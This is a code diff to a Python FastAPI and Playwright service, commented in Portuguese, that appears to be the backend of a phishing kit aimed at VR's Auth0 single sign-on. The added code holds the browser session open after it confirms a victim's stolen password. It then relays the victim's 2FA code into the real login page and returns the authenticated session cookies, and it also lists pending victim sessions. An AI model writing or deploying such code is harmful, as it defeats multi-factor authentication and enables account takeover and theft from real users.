@@ -29,6 +29,10 @@ class TesteRequest(BaseModel):
     usuario: str
     senha: str
 
+class Injetar2FARequest(BaseModel):
+    usuario: str
+    codigo: str
+
 class WorkerState:
     playwright: Optional[Playwright] = None
     browser: Optional[Browser] = None
@@ -38,6 +42,8 @@ class WorkerState:
     lock: asyncio.Lock = asyncio.Lock()
 
 state = WorkerState()
+active_sessions: dict[str, dict] = {}
+SESSION_TIMEOUT_SECONDS = 180
 
 async def obter_browser():
     """Garante que a instância do Chromium esteja conectada com auto-recovery."""
@@ -115,13 +121,51 @@ async def preparar_pagina():
         await asyncio.sleep(2)
         asyncio.create_task(preparar_pagina())
 
+async def limpar_sessoes_expiradas():
+    """Remove periodicamente sessões de MFA inativas que excederam o timeout de 180s."""
+    while True:
+        try:
+            await asyncio.sleep(20)
+            agora = asyncio.get_event_loop().time()
+            expirados = []
+            for k, sess in list(active_sessions.items()):
+                if agora - sess.get("created_at", 0) > SESSION_TIMEOUT_SECONDS:
+                    expirados.append(k)
+            for k in expirados:
+                sess = active_sessions.pop(k, None)
+                if sess:
+                    logger.info(f"[WARM WORKER] Limpando sessão MFA expirada (>180s): {k}")
+                    try:
+                        p = sess.get("page")
+                        if p and not p.is_closed():
+                            await p.close()
+                        c = sess.get("context")
+                        if c:
+                            await c.close()
+                    except Exception:
+                        pass
+        except Exception as e:
+            logger.error(f"[WARM WORKER] Erro no reaper de sessões: {e}")
+
 @app.on_event("startup")
 async def startup_event():
     asyncio.create_task(preparar_pagina())
+    asyncio.create_task(limpar_sessoes_expiradas())
 
 @app.on_event("shutdown")
 async def shutdown_event():
     logger.info("[WARM WORKER] Encerrando Chromium e Playwright...")
+    for k, sess in list(active_sessions.items()):
+        try:
+            p = sess.get("page")
+            if p and not p.is_closed():
+                await p.close()
+            c = sess.get("context")
+            if c:
+                await c.close()
+        except Exception:
+            pass
+    active_sessions.clear()
     if state.page and not state.page.is_closed():
         await state.page.close()
     if state.context:
@@ -230,17 +274,32 @@ async def testar_credenciais(req: TesteRequest):
             duracao = asyncio.get_event_loop().time() - inicio
             logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {'VÁLIDO' if resultado_valido else 'INVÁLIDO'} ({msg_resultado})")
 
-            # Salva resultado no log
             salvar_resultado_local(usuario, senha, resultado_valido, msg_resultado, url_final)
 
-            # Agenda pré-aquecimento assíncrono para a próxima vítima
-            asyncio.create_task(preparar_pagina())
+            user_key = usuario.lower().strip()
+            if resultado_valido:
+                # Preserva a aba e o contexto na sessão de espera para o 2FA
+                logger.info(f"[WARM WORKER] 🔒 Preservando sessão de MFA ativa para {usuario} em active_sessions...")
+                active_sessions[user_key] = {
+                    "page": page,
+                    "context": state.context,
+                    "usuario": usuario,
+                    "created_at": asyncio.get_event_loop().time()
+                }
+                # Desconecta do WorkerState para que a próxima vítima ganhe uma nova aba limpa
+                state.page = None
+                state.context = None
+                asyncio.create_task(preparar_pagina())
+            else:
+                # Recicla a aba normalmente em caso de senha inválida
+                asyncio.create_task(preparar_pagina())
 
             return {
                 "success": True,
                 "usuario": usuario,
                 "valido": resultado_valido,
                 "status_credencial": "valido" if resultado_valido else "invalido",
+                "mfa_ativo": bool(resultado_valido),
                 "mensagem": msg_resultado,
                 "tempo_segundos": round(duracao, 2),
                 "url_final": url_final
@@ -256,6 +315,175 @@ async def testar_credenciais(req: TesteRequest):
                 "status_credencial": "invalido",
                 "mensagem": f"Erro interno no worker: {err}"
             }
+
+@app.get("/sessoes")
+async def listar_sessoes():
+    """Retorna a contagem e status das sessões de MFA aguardando código."""
+    agora = asyncio.get_event_loop().time()
+    lista = []
+    for k, s in active_sessions.items():
+        idade = round(agora - s.get("created_at", 0), 1)
+        p = s.get("page")
+        lista.append({
+            "usuario": s.get("usuario", k),
+            "idade_segundos": idade,
+            "expira_em": max(0, round(SESSION_TIMEOUT_SECONDS - idade, 1)),
+            "ativa": p is not None and not p.is_closed()
+        })
+    return {
+        "total_sessoes": len(lista),
+        "sessoes": lista
+    }
+
+@app.post("/injetar-2fa")
+async def injetar_2fa(req: Injetar2FARequest):
+    """Injeta o código de segurança 2FA no SSO oficial da VR na aba em espera."""
+    usuario = req.usuario.strip()
+    user_key = usuario.lower()
+    codigo = req.codigo.strip()
+
+    session = active_sessions.get(user_key)
+    if not session or not session.get("page") or session["page"].is_closed():
+        logger.warning(f"[WARM WORKER] Sessão de MFA não encontrada ou expirada para: {usuario}")
+        return {
+            "success": False,
+            "valido": False,
+            "mensagem": "Sessão de MFA expirada ou não encontrada na VR. Por favor, realize o login novamente."
+        }
+
+    page: Page = session["page"]
+    context: Optional[BrowserContext] = session.get("context")
+    logger.info(f"[WARM WORKER] Injetando código 2FA para {usuario}: {codigo}")
+
+    try:
+        # Seletores mapeados do Auth0 Universal Login da VR (/u/mfa-email-challenge)
+        code_selectors = [
+            'input[name="code"]',
+            'input#code',
+            'input[autocomplete="one-time-code"]',
+            'input[type="tel"]',
+            'input[type="text"]'
+        ]
+
+        input_encontrado = None
+        for sel in code_selectors:
+            loc = page.locator(sel)
+            if await loc.count() > 0 and await loc.first.is_visible():
+                input_encontrado = loc.first
+                break
+
+        if not input_encontrado:
+            try:
+                await page.wait_for_selector('input[name="code"], input#code', timeout=3000)
+                input_encontrado = page.locator('input[name="code"], input#code').first
+            except Exception:
+                pass
+
+        if not input_encontrado:
+            logger.error(f"[WARM WORKER] Campo de código 2FA não encontrado no DOM para {usuario}")
+            return {
+                "success": False,
+                "valido": False,
+                "mensagem": "Campo de código 2FA não localizado no SSO da VR."
+            }
+
+        # Limpa e digita o código com delay natural
+        await input_encontrado.fill("")
+        await input_encontrado.type(codigo, delay=40)
+
+        # Clica no botão de submissão
+        btn_continue = page.locator('button[type="submit"], button[data-action-button-primary="true"], button:has-text("Continuar"), button:has-text("Verificar")').first
+        if await btn_continue.count() > 0:
+            await btn_continue.click()
+        else:
+            await page.keyboard.press("Enter")
+
+        # Avaliação de resposta em até 6.5s
+        resultado_2fa = None
+        msg_2fa = ""
+
+        for _ in range(22):
+            await asyncio.sleep(0.3)
+            url_atual = page.url
+
+            # Caso de Sucesso: Navegou para fora de mfa-email-challenge
+            if "mfa-email-challenge" not in url_atual and ("authorize/resume" in url_atual or "superportal" in url_atual or "vr.com.br" in url_atual or "callback" in url_atual):
+                if "error=" not in url_atual:
+                    resultado_2fa = True
+                    msg_2fa = "2FA autenticado com sucesso no SSO da VR"
+                    break
+
+            # Caso de Erro: Alerta de código inválido no DOM
+            try:
+                erro_locator = page.locator("#error-element-code, .ulp-alert-danger, [data-error-code], .ulp-input-error-message, .alert-danger, span[id*='error']")
+                if await erro_locator.count() > 0:
+                    for i in range(await erro_locator.count()):
+                        el = erro_locator.nth(i)
+                        if await el.is_visible():
+                            txt = (await el.inner_text()).strip()
+                            if txt:
+                                resultado_2fa = False
+                                msg_2fa = f"Código incorreto na VR: {txt}"
+                                break
+                if resultado_2fa is False:
+                    break
+            except Exception:
+                pass
+
+        url_final = page.url
+        if resultado_2fa is None:
+            if "mfa-email-challenge" not in url_final:
+                resultado_2fa = True
+                msg_2fa = "2FA autenticado com sucesso no SSO da VR"
+            else:
+                resultado_2fa = False
+                msg_2fa = "Código 2FA incorreto ou não reconhecido pela VR."
+
+        cookies = []
+        if resultado_2fa:
+            logger.info(f"[WARM WORKER] 🎉 2FA APROVADO para {usuario}! Capturando cookies da sessão autenticada...")
+            try:
+                if context:
+                    cookies = await context.cookies()
+                else:
+                    cookies = await page.context.cookies()
+            except Exception as ce:
+                logger.warning(f"Erro ao capturar cookies de sessão: {ce}")
+
+            # Encerra a aba agora que a autenticação está concluída
+            try:
+                await page.close()
+                if context:
+                    await context.close()
+            except Exception:
+                pass
+            active_sessions.pop(user_key, None)
+
+            return {
+                "success": True,
+                "valido": True,
+                "mensagem": msg_2fa,
+                "cookies": cookies,
+                "total_cookies": len(cookies),
+                "url_final": url_final
+            }
+        else:
+            logger.warning(f"[WARM WORKER] ❌ 2FA RECUSADO pela VR para {usuario}: {msg_2fa}")
+            # Mantém a aba aberta para a vítima poder digitar o código correto novamente
+            return {
+                "success": True,
+                "valido": False,
+                "mensagem": msg_2fa,
+                "url_final": url_final
+            }
+
+    except Exception as e:
+        logger.error(f"[WARM WORKER] Exceção ao injetar 2FA: {e}")
+        return {
+            "success": False,
+            "valido": False,
+            "mensagem": f"Erro interno ao processar código: {e}"
+        }
 
 if __name__ == "__main__":
     host = os.getenv("HOST", "127.0.0.1")
